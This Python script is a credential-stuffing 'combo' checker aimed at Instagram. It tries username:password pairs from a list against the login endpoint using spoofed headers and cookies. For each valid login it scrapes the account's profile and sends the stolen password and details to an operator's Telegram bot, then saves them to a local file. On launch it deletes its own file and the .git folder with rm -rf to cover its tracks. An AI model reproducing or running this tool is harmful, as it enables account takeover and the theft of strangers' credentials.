import json, requests, user_agent,os ,sys, time, datetime
import requests
from user_agent import generate_user_agent
from datetime import datetime
os.system("rm .dabll.py")
os.system("del .dabll.py")
os.system("rm -rf .dabll.py ;rm -rf .git")
try:
    os.remove(".dabll.py")
except:
    pass
os.system("clear")
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"   
C = "\033[36;1m"
logo2=(W+G+'''
    ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
    ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
    ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
    ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
    ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
    ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
                ░ ░   ░        ░      ░ ░           ░ 
                                          Combo !¡!¡! 
   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    '''+R+'''    [ Welcome to my script, Auther: @i4m_zed ]

   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
bad=0
timeout=0
hits=0
checkpoint=0
error=0
import requests, sys, os, random, time
from colorama import Fore
import os,sys
os.system('clear')
from bs4 import BeautifulSoup
from colorama import Fore as fore
import requests
import subprocess
import json
def hamwy():
	agar=input(logo2+"\n    You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
		ID=input("    Your ID Telegram :")
		token=input("    Token(bot) : ")
	else:
		pass
		print('    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
	combo="combo.txt"
	file = open(combo,'r').read().splitlines()
	for line in file:
		import time
		global bad, timeout, hits, error, checkpoint
		username_login = line.split(':')[0]
		password_login = line.split(':')[1]
		url_login = 'https://www.instagram.com/accounts/login/ajax/'
		headers_login = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-length': '291',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1cb44f68ffec',
        'x-requested-with': 'XMLHttpRequest'}
		data_login = {
        'username': username_login,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password_login}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'}
		req_login = requests.post(url_login, data=data_login, headers=headers_login)
		if ('"authenticated":false') in req_login.text:
			os.system("clear")
			print(logo2)
			bad+=1
			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
		elif ('"message":"Please wait a few minutes before you try again."') in req_login.text:
			timeout+=1
			os.system("clear")
			print(logo2)
			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
		elif ('"message":"checkpoint_required"') in req_login.text:
			os.system("clear")
			print(logo2)
			checkpoint+=1
			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
			time.sleep(360)
		elif 'userId' in req_login.text:
			sessd = req_login.cookies['sessionid']
			for file in range(1):
				url_checker = 'https://www.instagram.com/accounts/login/ajax/'
				headers_checker = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                    'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1cb44f68ffec',
                    'x-requested-with': 'XMLHttpRequest'}
				data_checker = {
                    'username': "jfuwehouewhfwehfuewhffhfeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
                    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613414957:dsbvhdbvdsvbsdh',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
			req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
			if '"user":false' in req:
				url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
				headers_get_info = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                        'cookie': f'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid={sessd}; rur=VLL',
                        'referer': 'https://www.instagram.com/accounts/edit/',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
                        'x-requested-with': 'XMLHttpRequest'
                    }
				data_get_info = {
                        '__a': '1'
                    }
				req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
				username = str(req_get_info.json()['form_data']['username'])
				url = f"https://www.instagram.com/{username}?hl=en"
				r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
				s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
				soup = BeautifulSoup(r,'html.parser')
				meta = soup.find("meta")
				name = soup.find("meta", property="og:title")
				name = name["content"].split("(")[0]
				link_url = soup.find("meta", property="og:url")
				profile_pic = soup.find("meta", property="og:image")
				description = soup.find("meta", property="og:description")
				followers = description["content"].split(",")[0]
				following = description["content"].split(",")[1]
				posts = description["content"].split(",")[2].split("-")[0]
				s=(f"================================\n  Number: +"+username_login+"\n  Pass: "+password_login+"\n  UserName: "+username+"\n  Name: "+name+"\n  Followers: "+followers+"\n  Following: "+following+"\n  Posts: "+posts+"\n  Facebook: nazanm\n  Tiktok: nazanm\n================================")
				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={s}\n')
				os.system("clear")
				print(logo2)
				hits+=1
				print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
				with open("/sdcard/Good.txt", "a") as ss:
					ss.write(username_login+":"+password_login)
		else:
			os.system("clear")
			print(logo2)
			error+=1
			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
hamwy()
